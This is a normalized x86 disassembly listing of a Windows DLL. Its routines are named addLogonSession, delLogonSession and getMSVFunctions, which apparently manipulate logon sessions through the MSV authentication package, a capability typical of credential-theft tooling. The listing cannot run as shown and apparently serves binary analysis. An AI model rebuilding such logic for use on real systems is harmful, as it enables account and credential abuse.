test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov esi 0x4
sub esp 0x1c
mov esi esp
lea eax [ esp + 0x178 ]
mov [ esp + 0x30 ] esp
call sub_1000d2e0
mov ecx [ ebp + 0xc ]
call sub_10001850
mov ecx [ esp + 0x178 ]
mov edx [ ecx + 0x4 ]
mov [ esp + 0x37 ] al
lea eax [ esp + 0x1c8 ]
add esp 0x1c
mov [ esp + 0x24 ] eax
mov [ esp + edx + 0x15c ] r--data
test [ esp + 0x1a0 ] 0x1
lea eax [ esp + 0x160 ]
mov [ esp + 0x20 ] eax
mov [ esp + 0x160 ] r--data
je r-xdata
mov eax [ esp + 0x218 ]
push eax
jmp r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push ebx
call sub_100033b0
or eax 0x4
mov edx [ esp + 0x170 ]
mov [ edx ] ebx
mov eax [ esp + 0x180 ]
mov [ eax ] ebx
mov ecx [ esp + 0x190 ]
mov [ ecx ] ebx
mov edx [ esp + 0x174 ]
mov [ edx ] ebx
mov eax [ esp + 0x184 ]
mov [ eax ] ebx
mov ecx [ esp + 0x194 ]
mov [ ecx ] ebx
and [ esp + 0x1a0 ] 0xfffffffe
mov [ esp + 0x19c ] ebx
mov [ esp + 0x160 ] r--data
mov [ esp + 0x280 ] 0xa
mov eax [ esp + 0x198 ]
mov ebx eax
test eax eax
je r-xdata
mov ecx [ esp + 0x170 ]
mov eax [ ecx ]
push eax
call sub_100173b1
add esp 0x4
call sub_100173b1
add esp 0x4
lea edx [ esp + 0x1f4 ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
lea ecx [ esp + 0x164 ]
mov [ esp + 0x280 ] 0x9
call sub_10016412
mov [ esp + 0x280 ] 0x1
mov ecx [ esp + 0x15c ]
mov edx [ ecx + 0x4 ]
lea eax [ esp + 0x1ac ]
mov [ esp + edx + 0x15c ] r--data
push eax
mov [ esp + 0x1b0 ] r--data
call sub_10015fc5
mov edx [ esp + 0x30 ]
mov eax [ edx + 0x4 ]
lea ecx [ esp + 0x80 ]
add esp 0x4
mov [ esp + 0x20 ] ecx
mov [ esp + eax + 0x2c ] r--data
test [ esp + 0x70 ] 0x1
lea ecx [ esp + 0x30 ]
mov [ esp + 0x24 ] ecx
mov [ esp + 0x30 ] r--data
je r-xdata
mov edi [ eax ]
test edi edi
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push ebx
call sub_100033b0
or eax 0x4
mov eax [ esp + 0x40 ]
mov [ eax ] 0x0
mov ecx [ esp + 0x50 ]
mov [ ecx ] 0x0
mov edx [ esp + 0x60 ]
mov [ edx ] 0x0
mov eax [ esp + 0x44 ]
mov [ eax ] 0x0
mov ecx [ esp + 0x54 ]
mov [ ecx ] 0x0
mov edx [ esp + 0x64 ]
mov [ edx ] 0x0
and [ esp + 0x70 ] 0xfffffffe
mov [ esp + 0x6c ] 0x0
mov [ esp + 0x30 ] r--data
mov [ esp + 0x280 ] 0xc
mov eax [ esp + 0x68 ]
mov ebx eax
test eax eax
je r-xdata
mov edx [ esp + 0x40 ]
mov eax [ edx ]
push eax
call sub_100173b1
add esp 0x4
push ebx
call sub_100173b1
add esp 0x4
push 0x0
lea ecx [ esp + 0x18 ]
call sub_100163b9
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov edx [ esp + 0x24 ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
lea ecx [ esp + 0x34 ]
mov [ esp + 0x280 ] 0xb
call sub_10016412
mov [ esp + 0x280 ] 0x0
mov eax [ esp + 0x2c ]
mov ecx [ eax + 0x4 ]
lea edx [ esp + 0x7c ]
mov [ esp + ecx + 0x2c ] r--data
push edx
mov [ esp + 0x80 ] r--data
call sub_10015fc5
mov ecx [ esp + 0xc8 ]
mov edx [ ecx + 0x4 ]
lea eax [ esp + 0x118 ]
add esp 0x4
mov [ esp + 0x20 ] eax
mov [ esp + edx + 0xc4 ] r--data
mov [ esp + 0x280 ] 0xd
test [ esp + 0x108 ] 0x1
lea eax [ esp + 0xc8 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0xc8 ] r--data
je r-xdata
mov edi [ eax ]
test edi edi
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ esp + 0x14 ]
not esi
call sub_100163e1
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push ebx
call sub_100033b0
or eax 0x4
mov edx [ esp + 0xd8 ]
mov [ edx ] 0x0
mov eax [ esp + 0xe8 ]
mov [ eax ] 0x0
mov ecx [ esp + 0xf8 ]
mov [ ecx ] 0x0
mov edx [ esp + 0xdc ]
mov [ edx ] 0x0
mov eax [ esp + 0xec ]
mov [ eax ] 0x0
mov ecx [ esp + 0xfc ]
mov [ ecx ] 0x0
and [ esp + 0x108 ] 0xfffffffe
mov [ esp + 0x104 ] 0x0
mov [ esp + 0xc8 ] r--data
mov [ esp + 0x280 ] 0xe
mov eax [ esp + 0x100 ]
mov ebx eax
test eax eax
je r-xdata
mov ecx [ esp + 0xd8 ]
mov eax [ ecx ]
push eax
call sub_100173b1
add esp 0x4
push ebx
call sub_100173b1
add esp 0x4
push 0x0
lea ecx [ esp + 0x18 ]
call sub_100163b9
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
mov edx [ esp + 0x14 ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
mov esi 0x8
add esp 0x8
cmp [ esp + 0x22c ] esi
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
lea ecx [ esp + 0xcc ]
mov [ esp + 0x280 ] 0xd
call sub_10016412
mov [ esp + 0x280 ] 0xffffffff
mov ecx [ esp + 0xc4 ]
mov edx [ ecx + 0x4 ]
lea eax [ esp + 0x114 ]
mov [ esp + edx + 0xc4 ] r--data
push eax
mov [ esp + 0x118 ] r--data
call sub_10015fc5
mov al [ esp + 0x1f ]
add esp 0x4
jmp r-xdata
mov edi [ eax ]
test edi edi
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ esp + 0x14 ]
not esi
call sub_100163e1
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
xor ecx ecx
mov edi 0x7
mov [ esp + 0x22c ] edi
mov [ esp + 0x228 ] ebx
mov [ esp + 0x218 ] cx
cmp [ esp + 0x268 ] esi
jb r-xdata
mov eax [ esp + 0x218 ]
push eax
call sub_100173b1
add esp 0x4
push ebx
call sub_100033b0
or eax 0x4
mov ecx [ esp + 0x278 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x260 ]
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn 0xc
push ebx
call sub_100173b1
add esp 0x4
push 0x0
lea ecx [ esp + 0x18 ]
call sub_100163b9
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
cmp [ esp + 0x208 ] esi
jb r-xdata
mov edx [ esp + 0x254 ]
push edx
call sub_100173b1
add esp 0x4
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ esp + 0x14 ]
not esi
call sub_100163e1
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
xor ecx ecx
mov [ esp + 0x280 ] 0x2
mov [ esp + 0x208 ] edi
mov [ esp + 0x204 ] ebx
mov [ esp + 0x1f4 ] cx
cmp [ esp + 0x248 ] esi
jb r-xdata
mov eax [ esp + 0x1f4 ]
push eax
call sub_100173b1
add esp 0x4
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
mov edx [ esp + 0x234 ]
push edx
delLogonSession
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x64
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x60 ] eax
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
mov [ esp + 0xc ] edi
call sub_1000e0b0
test al al
je r-xdata
push esi
push edi
call getMSVFunctions
mov ecx [ esp + 0x74 ]
add esp 0x8
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn
xor eax eax
xor ebx ebx
mov [ esp + 0x18 ] ax
mov edi 0x7
push ebx
mov eax r--data
lea ecx [ esp + 0x1c ]
mov [ esp + 0x30 ] edi
mov [ esp + 0x2c ] ebx
call sub_10001f10
mov ecx [ esi ]
mov eax [ esi + 0x4 ]
cmp ecx eax
je r-xdata
push 0x44
mov eax r--data
lea ecx [ esp + 0x1c ]
call sub_10001f10
sub eax ecx
mov ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
jb r-xdata
mov al bl
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x60 ]
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn
mov eax [ esp + 0x18 ]
push eax
call sub_100173b1
add esp 0x4
cmp eax 0x2
ja r-xdata
xor ecx ecx
mov [ esp + 0x50 ] cx
push 0x1
mov eax r--data
lea ecx [ esp + 0x54 ]
mov [ esp + 0x68 ] edi
mov [ esp + 0x64 ] ebx
call sub_10001f10
mov eax [ esi ]
push ebx
mov [ esp + 0x4c ] edi
xor edx edx
push eax
or eax 0xffffffff
lea edi [ esp + 0x3c ]
mov [ esp + 0x4c ] ebx
mov [ esp + 0x3c ] dx
call sub_10001db0
mov edi [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
jbe r-xdata
lea edx [ esp + 0x34 ]
push edx
lea eax [ esp + 0x54 ]
push eax
call sub_1000faf0
add esp 0x8
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] edx
cmp eax ebx
je r-xdata
push ebx
push edi
or eax 0xffffffff
lea edi [ esp + 0x58 ]
call sub_10001db0
mov ecx [ esi + 0x4 ]
push ebx
sub ecx 0x1c
push ecx
or eax 0xffffffff
lea edi [ esp + 0x3c ]
call sub_10001db0
lea eax [ esp + 0x18 ]
push eax
mov eax r--data
lea ecx [ esp + 0x10 ]
push ecx
call [ rw-data ]
test eax eax
mov eax r--data
jns r-xdata
push 0x1
mov eax r--data
lea ecx [ esp + 0x1c ]
call sub_10001cd0
sub esp 0x1c
mov edi esp
mov [ esp + 0x2c ] esp
push ebx
lea edx [ esp + 0x38 ]
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
push edx
or eax 0xffffffff
mov [ edi ] cx
call sub_10001db0
mov ecx [ esp + 0x28 ]
call sub_10001850
add esp 0x1c
cmp [ esp + 0x2c ] 0x8
mov bl al
jb r-xdata
lea edx [ esp + 0x18 ]
push edx
jmp r-xdata
mov eax r--data
call sub_10001b20
lea esi [ esp + 0x34 ]
call sub_10001af0
lea esi [ esp + 0x50 ]
call sub_10001af0
jmp r-xdata
addLogonSession
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x184
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x180 ] eax
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
mov [ esp + 0x18 ] edi
call sub_1000e0b0
test al al
je r-xdata
push esi
push edi
call getMSVFunctions
mov ecx [ esp + 0x194 ]
add esp 0x8
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn
xor eax eax
xor ebx ebx
mov [ esp + 0x1c ] ax
push ebx
mov eax r--data
lea ecx [ esp + 0x20 ]
mov [ esp + 0x34 ] 0x7
mov [ esp + 0x30 ] ebx
call sub_10001f10
mov eax [ esi ]
mov edi [ esi + 0x4 ]
cmp eax edi
je r-xdata
push 0x72
mov eax r--data
lea ecx [ esp + 0x20 ]
call sub_10001f10
mov ecx edi
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x4
jb r-xdata
mov al bl
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x180 ]
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn
mov ecx [ esp + 0x1c ]
push ecx
call sub_100173b1
add esp 0x4
cmp eax 0x6
ja r-xdata
lea eax [ edi - 0x1c ]
push ebx
xor ecx ecx
push eax
or eax 0xffffffff
lea edi [ esp + 0xcc ]
mov [ esp + 0xe0 ] 0x7
mov [ esp + 0xdc ] ebx
mov [ esp + 0xcc ] cx
call sub_10001db0
xor edx edx
mov edi 0x7
push 0x20
mov eax r--data
lea ecx [ esp + 0x74 ]
mov [ esp + 0x88 ] edi
mov [ esp + 0x84 ] ebx
mov [ esp + 0x74 ] dx
call sub_10001f10
xor eax eax
xor ecx ecx
mov [ esp + 0x38 ] ax
mov [ esp + 0x54 ] cx
xor edx edx
push 0x1
mov eax r--data
lea ecx [ esp + 0xac ]
mov [ esp + 0x50 ] edi
mov [ esp + 0x4c ] ebx
mov [ esp + 0x6c ] edi
mov [ esp + 0x68 ] ebx
mov [ esp + 0xc0 ] edi
mov [ esp + 0xbc ] ebx
mov [ esp + 0xac ] dx
call sub_10001f10
mov ecx [ esi + 0x4 ]
xor eax eax
mov [ esp + 0x8c ] ax
mov [ esp + 0xa0 ] edi
mov edi [ esi ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
sub eax 0x4
mov [ esp + 0x9c ] ebx
je r-xdata
push ebx
push edi
or eax 0xffffffff
lea edi [ esp + 0x94 ]
call sub_10001db0
mov edi 0x1
mov eax esi
call sub_100101d0
push ebx
push eax
or eax 0xffffffff
lea edi [ esp + 0x40 ]
call sub_10001db0
mov edi 0x2
dec eax
je r-xdata
lea eax [ esp + 0x1c ]
push eax
mov eax r--data
mov eax 0x20
cmp [ esp + 0x80 ] eax
jne r-xdata
mov edi 0x3
mov eax esi
call sub_100101d0
cmp [ eax + 0x10 ] 0x20
push ebx
jne r-xdata
dec eax
jne r-xdata
push 0x1
mov eax r--data
lea ecx [ esp + 0x20 ]
call sub_10001cd0
sub esp 0x1c
mov ecx esp
mov [ esp + 0x2c ] esp
push ebx
lea eax [ esp + 0x3c ]
xor edx edx
push eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
or eax 0xffffffff
mov edi ecx
mov [ ecx ] dx
call sub_10001db0
mov ecx [ esp + 0x34 ]
call sub_10001850
add esp 0x1c
cmp [ esp + 0x30 ] 0x8
mov bl al
jb r-xdata
lea edx [ esp + 0x1c ]
push edx
mov eax r--data
jmp r-xdata
cmp [ esp + 0xd4 ] eax
jne r-xdata
mov edx [ esi ]
push edx
or eax 0xffffffff
lea edi [ esp + 0xb0 ]
call sub_10001db0
mov edi 0x1
mov eax esi
call sub_100101d0
push ebx
push eax
or eax 0xffffffff
lea edi [ esp + 0x94 ]
call sub_10001db0
mov edi 0x2
mov eax esi
call sub_100101d0
push ebx
push eax
or eax 0xffffffff
lea edi [ esp + 0x40 ]
call sub_10001db0
mov edi 0x3
jmp r-xdata
mov ecx [ esi ]
push ecx
or eax 0xffffffff
lea edi [ esp + 0x94 ]
call sub_10001db0
mov edi 0x1
mov eax esi
call sub_100101d0
push ebx
push eax
or eax 0xffffffff
lea edi [ esp + 0x40 ]
call sub_10001db0
mov edi 0x2
mov eax esi
call sub_100101d0
push ebx
push eax
or eax 0xffffffff
lea edi [ esp + 0x5c ]
call sub_10001db0
mov edi 0x3
mov eax esi
call sub_100101d0
lea edi [ esp + 0x70 ]
jmp r-xdata
lea eax [ esp + 0x8c ]
push eax
lea ecx [ esp + 0xac ]
push ecx
call sub_1000faf0
add esp 0x8
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] edx
cmp eax ebx
je r-xdata
push ebx
push edi
or eax 0xffffffff
lea edi [ esp + 0xb0 ]
call sub_10001db0
lea edi [ ebx + 0x1 ]
mov eax esi
call sub_100101d0
push ebx
push eax
or eax 0xffffffff
lea edi [ esp + 0x94 ]
call sub_10001db0
lea edi [ ebx + 0x2 ]
mov eax esi
call sub_100101d0
push ebx
push eax
or eax 0xffffffff
lea edi [ esp + 0x40 ]
call sub_10001db0
lea edi [ ebx + 0x3 ]
mov eax esi
call sub_100101d0
push ebx
push eax
or eax 0xffffffff
lea edi [ esp + 0x5c ]
call sub_10001db0
lea edi [ ebx + 0x4 ]
mov eax esi
call sub_100101d0
lea edi [ esp + 0x70 ]
jmp r-xdata
call sub_10001b20
lea esi [ esp + 0x8c ]
call sub_10001af0
lea esi [ esp + 0xa8 ]
call sub_10001af0
lea esi [ esp + 0x54 ]
call sub_10001af0
lea esi [ esp + 0x38 ]
call sub_10001af0
lea esi [ esp + 0x70 ]
call sub_10001af0
lea esi [ esp + 0xc4 ]
call sub_10001af0
jmp r-xdata
mov eax 0x18
cmp [ esp + 0x48 ] eax
ja r-xdata
mov eax esi
call sub_100101d0
lea edi [ esp + 0x54 ]
push ebx
push eax
or eax 0xffffffff
call sub_10001db0
cmp [ esp + 0x64 ] eax
ja r-xdata
lea esi [ esp + 0x158 ]
lea eax [ esp + 0x38 ]
lea edx [ esp + 0xe8 ]
call sub_1000f7a0
lea esi [ esp + 0x128 ]
lea eax [ esp + 0x54 ]
lea edx [ esp + 0xe0 ]
call sub_1000f7a0
lea edx [ esp + 0x100 ]
lea ecx [ esp + 0x70 ]
call sub_1000f7f0
lea edx [ esp + 0xf0 ]
lea ecx [ esp + 0xc4 ]
call sub_1000f7f0
push 0xa8
lea edx [ esp + 0xe4 ]
push edx
lea eax [ esp + 0x18 ]
push eax
call [ rw-data ]
test eax eax
mov eax r--data
jns r-xdata
lea ecx [ esp + 0x1c ]
push ecx
jmp r-xdata
mov eax r--data
sub_1000f7a0
cmp [ eax + 0x10 ] 0x0
jne r-xdata
movzx ecx [ eax + 0x10 ]
add cx cx
mov [ edx ] cx
mov [ edx + 0x4 ] esi
add ecx 0x2
mov [ edx + 0x2 ] cx
cmp [ eax + 0x14 ] 0x8
mov edx [ eax + 0x10 ]
jb r-xdata
xor eax eax
mov [ edx + 0x4 ] 0x0
mov [ edx ] eax
retn
push edx
mov ecx eax
push ecx
inc edx
push edx
push esi
call sub_100178fb
add esp 0x10
retn
mov ecx [ eax ]
push edx
push ecx
inc edx
push edx
push esi
call sub_100178fb
add esp 0x10
retn
sub_1000f7f0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002966e
mov eax [ fs : 0x0 ]
push eax
sub esp 0xe4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
mov [ ebp - 0x30 ] esi
mov edi ecx
mov ebx edx
mov [ ebp - 0xe0 ] r--data
mov [ ebp - 0xd0 ] r--data
mov [ ebp - 0x80 ] r--data
lea eax [ ebp - 0xc8 ]
push eax
lea ecx [ ebp - 0xe0 ]
mov [ ebp - 0x4 ] esi
push ecx
mov [ ebp - 0x30 ] 0x1
call sub_10004950
mov [ ebp - 0x4 ] 0x1
mov edx [ ebp - 0xe0 ]
mov eax [ edx + 0x4 ]
lea ecx [ ebp - 0xc8 ]
push ecx
mov [ ebp + eax - 0xe0 ] r--data
call sub_10004a00
mov [ ebp - 0xc8 ] r--data
mov [ ebp - 0x8c ] esi
mov [ ebp - 0x88 ] esi
mov [ ebp - 0x4 ] 0x3
test [ edi + 0x10 ] 0xfffffffe
jbe r-xdata
mov eax [ ebp - 0xe0 ]
mov ecx [ eax + 0x4 ]
lea edx [ ebp - 0x80 ]
mov [ ebp - 0xe4 ] edx
mov [ ebp + ecx - 0xe0 ] r--data
mov [ ebp - 0x4 ] 0x5
test [ ebp - 0x88 ] 0x1
lea edx [ ebp - 0xc8 ]
mov [ ebp - 0xe8 ] edx
mov [ ebp - 0xc8 ] r--data
je r-xdata
mov edx [ ebp - 0xe0 ]
mov ecx [ edx + 0x4 ]
mov eax [ ebp + ecx - 0xa8 ]
lea ecx [ ebp + ecx - 0xe0 ]
neg eax
sbb eax eax
and eax 0xfffffffc
add eax 0x4
push 0x0
call sub_100033b0
push 0x2
lea ecx [ esi + esi ]
lea eax [ ebp - 0x2c ]
mov edx edi
call sub_10001b50
push eax
lea eax [ ebp - 0xd0 ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_1000d3a0
add esp 0x8
mov [ ebp - 0x4 ] 0x3
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov ecx [ ebp - 0xb8 ]
mov [ ecx ] 0x0
mov edx [ ebp - 0xa8 ]
mov [ edx ] 0x0
mov eax [ ebp - 0x98 ]
mov [ eax ] 0x0
mov ecx [ ebp - 0xb4 ]
mov [ ecx ] 0x0
mov edx [ ebp - 0xa4 ]
mov [ edx ] 0x0
mov eax [ ebp - 0x94 ]
mov [ eax ] 0x0
and [ ebp - 0x88 ] 0xfffffffe
mov [ ebp - 0x8c ] 0x0
mov [ ebp - 0xc8 ] r--data
mov [ ebp - 0x4 ] 0x6
mov eax [ ebp - 0x90 ]
mov ebx eax
test eax eax
je r-xdata
mov eax [ ebp - 0xb8 ]
mov eax [ eax ]
push eax
call sub_100173b1
add esp 0x4
mov edx [ ebp - 0xe0 ]
mov eax [ edx + 0x4 ]
mov ecx [ ebp + eax - 0xcc ]
lea eax [ ebp + eax - 0xe0 ]
and ecx 0xfffff9ff
or ecx 0x800
lea edx [ ebp - 0x34 ]
mov [ eax + 0x14 ] ecx
push edx
lea eax [ ebp - 0xe0 ]
push eax
call sub_1000fc40
mov cl [ ebp - 0x34 ]
mov [ ebx + esi ] cl
mov eax [ edi + 0x10 ]
inc esi
shr eax 0x1
cmp esi eax
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_100173b1
add esp 0x4
lea ecx [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] 0x5
call sub_10016412
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xe0 ]
mov edx [ ecx + 0x4 ]
mov [ ebp + edx - 0xe0 ] r--data
mov eax [ ebp - 0xd0 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + ecx - 0xd0 ] r--data
mov edx [ ebp - 0xe0 ]
mov eax [ edx + 0x4 ]
lea ecx [ ebp - 0x80 ]
mov [ ebp + eax - 0xe0 ] r--data
push ecx
mov [ ebp - 0x80 ] r--data
call sub_10015fc5
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10016ec3
mov esp ebp
pop ebp
retn
mov edi [ eax ]
test edi edi
je r-xdata
push ebx
call sub_100173b1
add esp 0x4
push 0x0
lea ecx [ ebp - 0x30 ]
call sub_100163b9
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x30 ]
not esi
call sub_100163e1
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
sub_1000faf0
push ebp
mov ebp esp
push 0xffffffff
push sub_100295ea
mov eax [ fs : 0x0 ]
push eax
sub esp 0xb8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc0 ] r--data
mov [ ebp - 0xb0 ] r--data
mov [ ebp - 0x60 ] r--data
lea eax [ ebp - 0xa8 ]
push eax
lea ecx [ ebp - 0xc0 ]
mov [ ebp - 0x4 ] esi
mov edi 0x1
push ecx
mov [ ebp - 0x18 ] edi
call sub_10004950
mov [ ebp - 0x4 ] edi
mov edx [ ebp - 0xc0 ]
mov eax [ edx + 0x4 ]
lea ecx [ ebp - 0xa8 ]
push ecx
mov [ ebp + eax - 0xc0 ] r--data
call sub_10004a00
mov [ ebp - 0xa8 ] r--data
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x68 ] esi
mov edx [ ebp + 0x8 ]
push edx
lea eax [ ebp - 0xb0 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_1000d3a0
add esp 0x8
lea ecx [ ebp - 0x10 ]
push ecx
lea edx [ ebp - 0xc0 ]
push edx
call sub_1000fde0
mov eax [ ebp - 0xc0 ]
mov ecx [ eax + 0x4 ]
mov eax [ ebp + ecx - 0x88 ]
lea ecx [ ebp + ecx - 0xc0 ]
neg eax
sbb eax eax
and eax 0xfffffffc
add eax 0x4
push esi
call sub_100033b0
mov ecx [ ebp + 0xc ]
push ecx
lea edx [ ebp - 0xb0 ]
push edx
call sub_1000d3a0
add esp 0x8
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0xc0 ]
push ecx
call sub_1000ff80
mov esi [ ebp - 0x14 ]
mov edi [ ebp - 0x10 ]
lea ecx [ ebp - 0xc0 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10003850
mov eax esi
mov edx edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_1000fc40
push ebp
mov ebp esp
push 0xffffffff
push sub_10028cb8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x18 ] edi
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
mov [ ebp - 0x2c ] esi
cmp ecx edi
je r-xdata
push edi
push esi
mov [ ebp - 0x4 ] edi
call sub_10004770
mov [ ebp - 0x28 ] al
mov [ ebp - 0x4 ] 0x1
test al al
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
mov edx [ ebp - 0x18 ]
add ecx esi
test edx edx
je r-xdata
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
add eax esi
lea edi [ ebp - 0x1c ]
call sub_100034b0
mov edi eax
mov [ ebp - 0x4 ] 0x2
call sub_100138b0
mov [ ebp - 0x4 ] 0x1
mov ebx [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
test ebx ebx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ ecx + 0xc ]
or eax edx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x3
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov ecx [ eax + esi + 0x38 ]
push ebx
add eax esi
lea ebx [ ebp - 0x18 ]
push ebx
push eax
xor edi edi
test ecx ecx
mov [ ebp - 0x20 ] 0x1
mov eax [ ebp - 0x20 ]
push eax
sete dl
mov [ ebp - 0x30 ] dl
mov eax [ ebp - 0x30 ]
mov edx [ ebp - 0x14 ]
mov edx [ edx ]
mov edx [ edx + 0x24 ]
push edi
push eax
push ecx
lea ecx [ ebp - 0x34 ]
push ecx
mov ecx [ ebp - 0x14 ]
call edx
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x20 ]
call sub_100163b9
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax esi
